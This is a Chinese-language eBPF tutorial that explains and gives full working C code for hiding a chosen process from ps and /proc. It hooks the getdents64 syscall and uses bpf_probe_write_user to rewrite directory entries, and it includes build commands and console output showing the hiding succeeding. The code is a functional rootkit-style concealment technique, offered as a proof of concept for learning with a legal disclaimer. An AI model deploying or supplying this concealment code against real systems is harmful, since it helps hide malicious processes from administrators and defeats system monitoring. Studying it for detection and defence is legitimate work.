# eBPF 開發實踐：使用 eBPF 隱藏進程或文件信息

eBPF（擴展的伯克利數據包過濾器）是 Linux 內核中的一個強大功能，可以在無需更改內核源代碼或重啟內核的情況下，運行、加載和更新用戶定義的代碼。這種功能讓 eBPF 在網絡和系統性能分析、數據包過濾、安全策略等方面有了廣泛的應用。

在本篇教程中，我們將展示如何利用 eBPF 來隱藏進程或文件信息，這是網絡安全和防禦領域中一種常見的技術。

## 背景知識與實現機制

"進程隱藏" 能讓特定的進程對操作系統的常規檢測機制變得不可見。在黑客攻擊或系統防禦的場景中，這種技術都可能被應用。具體來說，Linux 系統中每個進程都在 /proc/ 目錄下有一個以其進程 ID 命名的子文件夾，包含了該進程的各種信息。`ps` 命令就是通過查找這些文件夾來顯示進程信息的。因此，如果我們能隱藏某個進程的 /proc/ 文件夾，就能讓這個進程對 `ps` 命令等檢測手段“隱身”。

要實現進程隱藏，關鍵在於操作 `/proc/` 目錄。在 Linux 中，`getdents64` 系統調用可以讀取目錄下的文件信息。我們可以通過掛接這個系統調用，修改它返回的結果，從而達到隱藏文件的目的。實現這個功能需要使用到 eBPF 的 `bpf_probe_write_user` 功能，它可以修改用戶空間的內存，因此能用來修改 `getdents64` 返回的結果。

下面，我們會詳細介紹如何在內核態和用戶態編寫 eBPF 程序來實現進程隱藏。

### 內核態 eBPF 程序實現

接下來，我們將詳細介紹如何在內核態編寫 eBPF 程序來實現進程隱藏。首先是 eBPF 程序的起始部分：

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");
```

我們首先需要理解這個 eBPF 程序的基本構成和使用到的幾個重要組件。前幾行引用了幾個重要的頭文件，如 "vmlinux.h"、"bpf_helpers.h"、"bpf_tracing.h" 和 "bpf_core_read.h"。這些文件提供了 eBPF 編程所需的基礎設施和一些重要的函數或宏。

- "vmlinux.h" 是一個包含了完整的內核數據結構的頭文件，是從 vmlinux 內核二進制中提取的。使用這個頭文件，eBPF 程序可以訪問內核的數據結構。
- "bpf_helpers.h" 頭文件中定義了一系列的宏，這些宏是 eBPF 程序使用的 BPF 助手（helper）函數的封裝。這些 BPF 助手函數是 eBPF 程序和內核交互的主要方式。
- "bpf_tracing.h" 是用於跟蹤事件的頭文件，它包含了許多宏和函數，這些都是為了簡化 eBPF 程序對跟蹤點（tracepoint）的操作。
- "bpf_core_read.h" 頭文件提供了一組用於從內核讀取數據的宏和函數。

程序中定義了一系列的 map 結構，這些 map 是 eBPF 程序中的主要數據結構，它們用於在內核態和用戶態之間共享數據，或者在 eBPF 程序中存儲和傳遞數據。

其中，"rb" 是一個 Ringbuffer 類型的 map，它用於從內核向用戶態傳遞消息。Ringbuffer 是一種能在內核和用戶態之間高效傳遞大量數據的數據結構。

"map_buffs" 是一個 Hash 類型的 map，它用於存儲目錄項（dentry）的緩衝區地址。

"map_bytes_read" 是另一個 Hash 類型的 map，它用於在數據循環中啟用搜索。

"map_to_patch" 是另一個 Hash 類型的 map，存儲了需要被修改的目錄項（dentry）的地址。

"map_prog_array" 是一個 Prog Array 類型的 map，它用於保存程序的尾部調用。

程序中的 "target_ppid" 和 "pid_to_hide_len"、"pid_to_hide" 是幾個重要的全局變量，它們分別存儲了目標父進程的 PID、需要隱藏的 PID 的長度以及需要隱藏的 PID。

接下來的代碼部分，程序定義了一個名為 "linux_dirent64" 的結構體，這個結構體代表一個 Linux 目錄項。然後程序定義了兩個函數，"handle_getdents_enter" 和 "handle_getdents_exit"，這兩個函數分別在 getdents64 系統調用的入口和出口被調用，用於實現對目錄項的操作。

```c

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the string representation
// of the PID to hide. This becomes the name
// of the folder in /proc/
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN];

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ }; 
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}
```

在這部分代碼中，我們可以看到 eBPF 程序的一部分具體實現，該程序負責在 `getdents64` 系統調用的入口處進行處理。

我們首先聲明瞭幾個全局的變量。其中 `target_ppid` 代表我們要關注的目標父進程的 PID。如果這個值為 0，那麼我們將關注所有的進程。`pid_to_hide_len` 和 `pid_to_hide` 則分別用來存儲我們要隱藏的進程的 PID 的長度和 PID 本身。這個 PID 會轉化成 `/proc/` 目錄下的一個文件夾的名稱，因此被隱藏的進程在 `/proc/` 目錄下將無法被看到。

接下來，我們聲明瞭一個名為 `linux_dirent64` 的結構體。這個結構體代表一個 Linux 目錄項，包含了一些元數據，如 inode 號、下一個目錄項的偏移、當前目錄項的長度、文件類型以及文件名。

然後是 `getdents64` 函數的原型。這個函數是 Linux 系統調用，用於讀取一個目錄的內容。我們的目標就是在這個函數執行的過程中，對目錄項進行修改，以實現進程隱藏。

隨後的部分是 eBPF 程序的具體實現。我們在 `getdents64` 系統調用的入口處定義了一個名為 `handle_getdents_enter` 的函數。這個函數首先獲取了當前進程的 PID 和線程組 ID，然後檢查這個進程是否是我們關注的進程。如果我們設置了 `target_ppid`，那麼我們就只關注那些父進程的 PID 為 `target_ppid` 的進程。如果 `target_ppid` 為 0，我們就關注所有進程。

在確認了當前進程是我們關注的進程之後，我們將 `getdents64` 系統調用的參數保存到一個 map 中，以便在系統調用返回時使用。我們特別關注 `getdents64` 系統調用的第二個參數，它是一個指向 `linux_dirent64` 結構體的指針，代表了系統調用要讀取的目錄的內容。我們將這個指針以及當前的 PID 和線程組 ID 作為鍵值對保存到 `map_buffs` 這個 map 中。

至此，我們完成了 `getdents64` 系統調用入口處的處理。在系統調用返回時，我們將會在 `handle_getdents_exit` 函數中，對目錄項進行修改，以實現進程隱藏。

在接下來的代碼段中，我們將要實現在 `getdents64` 系統調用返回時的處理。我們主要的目標就是找到我們想要隱藏的進程，並且對目錄項進行修改以實現隱藏。

我們首先定義了一個名為 `handle_getdents_exit` 的函數，它將在 `getdents64` 系統調用返回時被調用。

```c

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // All of this is quite complex, but basically boils down to
    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
    // patching
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i ++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr+bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++) {
            if (filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        if (j == pid_to_hide_len) {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

```

在這個函數中，我們首先獲取了當前進程的 PID 和線程組 ID，然後檢查系統調用是否讀取到了目錄的內容。如果沒有讀取到內容，我們就直接返回。

然後我們從 `map_buffs` 這個 map 中獲取 `getdents64` 系統調用入口處保存的目錄內容的地址。如果我們沒有保存過這個地址，那麼就沒有必要進行進一步的處理。

接下來的部分有點複雜，我們用了一個循環來迭代讀取目錄的內容，並且檢查是否有我們想要隱藏的進程的 PID。如果我們找到了，我們就用 `bpf_tail_call` 函數跳轉到 `handle_getdents_patch` 函數，進行實際的隱藏操作。

```c
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}

```

在 `handle_getdents_patch` 函數中，我們首先檢查我們是否已經找到了我們想要隱藏的進程的 PID。然後我們讀取目錄項的內容，並且修改 `d_reclen` 字段，讓它覆蓋下一個目錄項，這樣就可以隱藏我們的目標進程了。

在這個過程中，我們用到了 `bpf_probe_read_user`、`bpf_probe_read_user_str`、`bpf_probe_write_user` 這幾個函數來讀取和寫入用戶空間的數據。這是因為在內核空間，我們不能直接訪問用戶空間的數據，必須使用這些特殊的函數。

在我們完成隱藏操作後，我們會向一個名為 `rb` 的環形緩衝區發送一個事件，表示我們已經成功地隱藏了一個進程。我們用 `bpf_ringbuf_reserve` 函數來預留緩衝區空間，然後將事件的數據填充到這個空間，並最後用 `bpf_ringbuf_submit` 函數將事件提交到緩衝區。

最後，我們清理了之前保存在 map 中的數據，並返回。

這段代碼是在 eBPF 環境下實現進程隱藏的一個很好的例子。通過這個例子，我們可以看到 eBPF 提供的豐富的功能，如系統調用跟蹤、map 存儲、用戶空間數據訪問、尾調用等。這些功能使得我們能夠在內核空間實現複雜的邏輯，而不需要修改內核代碼。

## 用戶態 eBPF 程序實現

我們在用戶態的 eBPF 程序中主要進行了以下幾個操作：

1. 打開 eBPF 程序。
2. 設置我們想要隱藏的進程的 PID。
3. 驗證並加載 eBPF 程序。
4. 等待並處理由 eBPF 程序發送的事件。

首先，我們打開了 eBPF 程序。這個過程是通過調用 `pidhide_bpf__open` 函數實現的。如果這個過程失敗了，我們就直接返回。

```c
    skel = pidhide_bpf__open();
    if (!skel)
    {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }
```

接下來，我們設置了我們想要隱藏的進程的 PID。這個過程是通過將 PID 保存到 eBPF 程序的 `rodata` 區域實現的。默認情況下，我們隱藏的是當前進程。

```c
    char pid_to_hide[10];
    if (env.pid_to_hide == 0)
    {
        env.pid_to_hide = getpid();
    }
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
    skel->rodata->target_ppid = env.target_ppid;
```

然後，我們驗證並加載 eBPF 程序。這個過程是通過調用 `pidhide_bpf__load` 函數實現的。如果這個過程失敗了，我們就進行清理操作。

```c
    err = pidhide_bpf__load(skel);
    if (err)
    {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
```

最後，我們等待並處理由 eBPF 程序發送的事件。這個過程是通過調用 `ring_buffer__poll` 函數實現的。在這個過程中，我們每隔一段時間就檢查一次環形緩衝區中是否有新的事件。如果有，我們就調用 `handle_event` 函數來處理這個事件。

```c
printf("Successfully started!\n");
printf("Hiding PID %d\n", env.pid_to_hide);
while (!exiting)
{
    err = ring_buffer__poll(rb, 100 /* timeout, ms */);
    /* Ctrl-C will cause -EINTR */
    if (err == -EINTR)
    {
        err = 0;
        break;
    }
    if (err < 0)
    {
        printf("Error polling perf buffer: %d\n", err);
        break;
    }
}
```

`handle_event` 函數中，我們根據事件的內容打印了相應的消息。這個函數的參數包括一個上下文，事件的數據，以及數據的大小。我們首先將事件的數據轉換為 `event` 結構體，然後根據 `success` 字段判斷這個事件是否表示成功隱藏了一個進程，最後打

印相應的消息。

```c
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}
```

這段代碼展示瞭如何在用戶態使用 eBPF 程序來實現進程隱藏的功能。我們首先打開 eBPF 程序，然後設置我們想要隱藏的進程的 PID，再驗證並加載 eBPF 程序，最後等待並處理由 eBPF 程序發送的事件。這個過程中，我們使用了 eBPF 提供的一些高級功能，如環形緩衝區和事件處理，這些功能使得我們能夠在用戶態方便地與內核態的 eBPF 程序進行交互。

完整源代碼：<https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/24-hide>

> 本文所示技術僅為概念驗證，僅供學習使用，嚴禁用於不符合法律法規要求的場景。

## 編譯運行，隱藏 PID

首先，我們需要編譯 eBPF 程序：

```bash
make
```

然後，假設我們想要隱藏進程 ID 為 1534 的進程，可以運行如下命令：

```sh
sudo ./pidhide --pid-to-hide 1534
```

這條命令將使所有嘗試讀取 `/proc/` 目錄的操作都無法看到 PID 為 1534 的進程。例如，我們可以選擇一個進程進行隱藏：

```console
$ ps -aux | grep 1534
yunwei      1534  0.0  0.0 244540  6848 ?        Ssl  6月02   0:00 /usr/libexec/gvfs-mtp-volume-monitor
yunwei     32065  0.0  0.0  17712  2580 pts/1    S+   05:43   0:00 grep --color=auto 1534
```

此時通過 ps 命令可以看到進程 ID 為 1534 的進程。但是，如果我們運行 `sudo ./pidhide --pid-to-hide 1534`，再次運行 `ps -aux | grep 1534`，就會發現進程 ID 為 1534 的進程已經不見了。

```console
$ sudo ./pidhide --pid-to-hide 1534
Hiding PID 1534
Hid PID from program 31529 (ps)
Hid PID from program 31551 (ps)
Hid PID from program 31560 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31585 (bash)
Hid PID from program 31585 (bash)
Hid PID from program 31609 (bash)
Hid PID from program 31640 (ps)
Hid PID from program 31649 (ps)
```

這個程序將匹配這個 pid 的進程隱藏，使得像 `ps` 這樣的工具無法看到，我們可以通過 `ps aux | grep 1534` 來驗證。

```console
$ ps -aux | grep 1534
root       31523  0.1  0.0  22004  5616 pts/2    S+   05:42   0:00 sudo ./pidhide -p 1534
root       31524  0.0  0.0  22004   812 pts/3    Ss   05:42   0:00 sudo ./pidhide -p 1534
root       31525  0.3  0.0   3808  2456 pts/3    S+   05:42   0:00 ./pidhide -p 1534
yunwei     31583  0.0  0.0  17712  2612 pts/1    S+   05:42   0:00 grep --color=auto 1534
```

## 總結

通過本篇 eBPF 入門實踐教程，我們深入瞭解瞭如何使用 eBPF 來隱藏進程或文件信息。我們學習瞭如何編寫和加載 eBPF 程序，如何通過 eBPF 攔截系統調用並修改它們的行為，以及如何將這些知識應用到實際的網絡安全和防禦工作中。此外，我們也瞭解了 eBPF 的強大性，尤其是它能在不需要修改內核源代碼或重啟內核的情況下，允許用戶在內核中執行自定義代碼的能力。

您還可以訪問我們的教程代碼倉庫 <https://github.com/eunomia-bpf/bpf-developer-tutorial> 或網站 <https://eunomia.dev/zh/tutorials/> 以獲取更多示例和完整的教程。
